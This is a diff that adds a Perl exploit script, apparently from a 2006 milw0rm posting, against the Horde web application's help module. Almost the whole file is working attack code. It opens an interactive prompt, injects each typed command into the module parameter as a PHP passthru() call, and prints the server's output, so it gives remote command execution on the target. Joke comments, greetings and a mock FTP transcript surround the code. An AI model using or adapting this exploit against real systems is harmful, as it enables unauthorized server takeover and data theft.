@@ -1,0 +1,130 @@
+#!/usr/bin/perl 
+# Wed Apr  5 21:51:12 CEST 2006 jolascoaga@514.es
+#
+# Horde help module remote execution
+# 
+# telnet 310.27.901.33.1109 1689 # thanks horatio for the address
+# USER paranoia
+# PASS total
+# SYST
+# REST 100
+# REST 0
+# PWD
+# TYPE A
+# PASV
+# LIST
+# CWD 0days
+# GET horddy.pl
+#
+# w0w this damn 0day ftp is so sexy!
+# 
+# GO GO GO !! GO GO GO !! Team fall back!
+# 
+# Example: ./horddy.pl --host=http://www.server.com/horde
+# 
+# Now for your X-box !
+# 
+# Greets:
+#  - all 514 crew 
+#  - mallorca ppl r0xing.
+#
+# THIS IS PENE! TIMMY!!! LIVIN' A LIE!
+# 
+ 
+
+use strict;
+use LWP::UserAgent;
+use LWP::Simple;
+use HTTP::Request;
+use HTTP::Response;
+use Getopt::Long;
+
+$| = 1;   # mess with the best? don't mess with my buffer
+
+my ($proxy,$proxy_user,$proxy_pass);
+my ($host,$debug,$dir, $command);
+my $use_ssl = 0;
+
+my $options = GetOptions (
+  'host=s'      => \$host, 
+  'dir=s'      => \$dir,
+  'proxy=s'           => \$proxy,
+  'proxy_user=s'      => \$proxy_user,
+  'proxy_pass=s'      => \$proxy_pass,
+  'debug'             => \$debug);
+
+&help unless ($host); # please don't try this at home.
+
+$dir = "/horde/" unless($dir);
+print "$host - $dir\n";
+
+while () {
+print "horddy> "; # lost connection
+while(<STDIN>) {
+$command=$_;
+chomp($command);
+last;
+}
+&send($command);
+}
+
+sub buildcmd {# this is a useful comment
+my ($cmd) = @_;
+# wonderful hacking
+$cmd =~ s/ /\%20/gi;
+$cmd =~ s/\//\"\.chr\(47\)\.\"/gi;
+
+return $cmd;
+}
+
+sub send {
+    my ($tmp) = @_;
+    my $ok=0;
+    my $cmd = buildcmd ($tmp); # this is really magic ^^
+    my $socket;
+    LWP::Debug::level('+') if $debug; # but remember this is crap :D
+
+    my $ua = new LWP::UserAgent();   
+    $ua->agent("Nozilla/P.N (Just for IDS woring)"); # this is not me :/
+
+    my $string = "/$dir/services/help/?show=about&module=;\".passthru(\"$cmd\");'.";
+
+    if ($host !~ /^http/) {
+$host = sprintf ("http://%s", $host); # CRAP CRAP CRAP
+    }
+
+    my $req = HTTP::Request->new (GET => $host.$string);
+    $ua->proxy(['http'] => $proxy) if $proxy;
+    $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;
+
+    print $req->as_string() if $debug; 
+
+    my $res = $ua->request($req);
+    my $html = $res->content(); 
+
+    foreach (split(/\n/,$html)) {
+if ((/<h2/) or (/<br \/>/)) { # brum brum conditionals desmitified
+last;
+}
+print "$_\n" if $ok eq "1"; # i don't think this is usefull 
+if (/<body class=/) {
+$ok = 1;
+}  
+    }
+}
+
+sub help {
+    print "Syntax: ./$0 --host=url --dir=/horde [options]\n";
+    print "\t--proxy (http), --proxy_user, --proxy_pass\n";
+    print "\t--debug\n";
+    print "the default directory is /horde\n";
+    print "\nExample\n";
+    print "bash# $0 --host=http(s)://www.server.com/\n";
+    print "\n";
+    exit(1);
+}
+exit 0;
+# y00000w this is the best part.
+# remember mallorca es fonki :D
+
+# milw0rm.com [2006-04-07]
